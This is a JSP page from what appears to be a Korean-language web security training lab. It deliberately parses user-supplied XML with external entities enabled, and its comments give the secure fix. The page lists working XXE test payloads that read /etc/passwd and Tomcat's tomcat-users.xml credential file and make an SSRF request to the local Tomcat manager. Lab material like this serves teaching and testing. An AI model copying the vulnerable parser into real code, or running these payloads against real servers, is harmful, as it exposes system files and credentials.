<%@ page contentType="text/html; charset=UTF-8" %>
<%@ page import="javax.xml.parsers.*, org.xml.sax.*, org.w3c.dom.*, java.io.*" %>
<%
  // [VULN] XXE - XML 파싱 시 외부 엔티티 처리 허용
  // [FIX] 아래 설정으로 외부 엔티티 비활성화:
  //   factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
  //   factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
  //   factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
  //   factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
  //   factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");

  String xml = request.getParameter("xml");
  if (xml == null) xml = "";
  String result = "";

  if (!xml.isEmpty()) {
      try {
          // [VULN] 기본 설정 = 외부 엔티티 처리 활성화
          DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
          DocumentBuilder builder = factory.newDocumentBuilder();
          Document doc = builder.parse(new InputSource(new StringReader(xml)));

          // 루트 엘리먼트의 텍스트 내용 출력
          NodeList nodes = doc.getDocumentElement().getChildNodes();
          StringBuilder sb = new StringBuilder();
          for (int i = 0; i < nodes.getLength(); i++) {
              sb.append(nodes.item(i).getTextContent());
          }
          result = sb.toString();
      } catch (Exception e) {
          result = "Error: " + e.getMessage();
      }
  }
%>
<html>
<head><title>XXE Lab</title></head>
<body>
<h2>XXE (XML External Entity)</h2>
<form method="POST">
  <textarea name="xml" rows="10" cols="70"><%=xml.replace("<","&lt;").replace(">","&gt;")%></textarea><br>
  <input type="submit" value="파싱">
</form>

<% if (!result.isEmpty()) { %>
  <h3>파싱 결과:</h3>
  <pre><%=result.replace("<","&lt;").replace(">","&gt;")%></pre>
<% } %>

<hr>
<h3>테스트 페이로드</h3>
<pre>
파일 읽기:
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;data&gt;&amp;xxe;&lt;/data&gt;

SSRF:
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM "http://localhost:8080/manager/html"&gt;
]&gt;
&lt;data&gt;&amp;xxe;&lt;/data&gt;

Tomcat 설정 읽기:
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM "file:///opt/tomcat/conf/tomcat-users.xml"&gt;
]&gt;
&lt;data&gt;&amp;xxe;&lt;/data&gt;
</pre>
<a href="index.jsp">← 메인</a>
</body>
</html>
